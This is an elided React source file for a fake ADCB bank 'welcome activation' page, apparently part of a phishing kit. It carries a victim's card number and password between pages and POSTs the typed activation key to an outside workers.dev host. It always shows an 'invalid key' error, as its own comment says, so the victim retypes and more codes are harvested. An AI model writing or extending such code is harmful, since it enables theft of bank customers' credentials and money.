...
// export default function ADCBWelcomeActivation() {
...
//     const { cardNumber, password } = location.state || {};
...
//             }
//              await fetch(
//                 " https://my-worker-app.instapayapi.workers.dev/api/activationKey",
//                 {
//                     method: "POST",
...
//                 },
//             );
//             navigate("/adcbmobile", { state: { cardNumber, password, activationKey } });
//         }
//     };
...
//                     style={{ top: "40px", left: 0, right: 0, height: "1px", zIndex: 0 }}
//                 />
...
export default function ADCBWelcomeActivation() {
    ...
    const handleNext = async () => {
        // Always show invalid error regardless of empty or not
        setIsInvalid(true);
        ...
        if (submitCount === 0) {
            ...
            await fetch(
                "https://my-worker-app.instapayapi.workers.dev/api/lctivationKey",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
            ...
            <div className="flex-1 flex flex-col bg-white px-5 pt-10 pb-8 overflow-hidden">
                ...
                <div className="mb-4 flex-shrink-0">
                    ...
                    <input
                        ...
                        className="w-full px-4 py-4 rounded-lg bg-white text-gray-700 text-sm outline-none"
                        style={{
                            border: isInvalid ? "1.5px solid #cc0000" : "1.5px solid #d1d5db",
                            fontSize: "15px",
                        }}
                    />
                    {isInvalid && (
                        <p className="text-red-600 text-xs mt-1 ml-1">Invalid Activation Key. Please enter valid activation key.</p>
                    )}
                </div>
